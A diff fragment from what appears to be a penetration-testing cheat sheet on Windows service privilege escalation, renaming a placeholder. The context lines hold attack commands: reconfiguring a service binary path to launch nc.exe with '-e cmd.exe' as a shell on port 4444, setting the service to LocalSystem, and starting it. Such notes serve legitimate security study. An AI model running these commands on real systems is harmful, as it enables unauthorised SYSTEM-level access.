@@ -154,17 +154,17 @@ accesschk.exe /accepteula -ucqv <service_name>
 
 ## reconfigure service
 ```
-sc config <service> binpath= 'C:\nc.exe -nv 127.0.0.1 4444 -e C:\WINDOWS\System32\cmd.exe'
+sc config <SERVICE> binpath= 'C:\nc.exe -nv 127.0.0.1 4444 -e C:\WINDOWS\System32\cmd.exe'
 ```
 
 ## change service
 ```
-sc config <service> obj= '.\LocalSystem' password= ''
+sc config <SERVICE> obj= '.\LocalSystem' password= ''
 ```
 
 ## start service
 ```
-net start <service>
+net start <SERVICE>
 ```
 
 ## check permission (1)
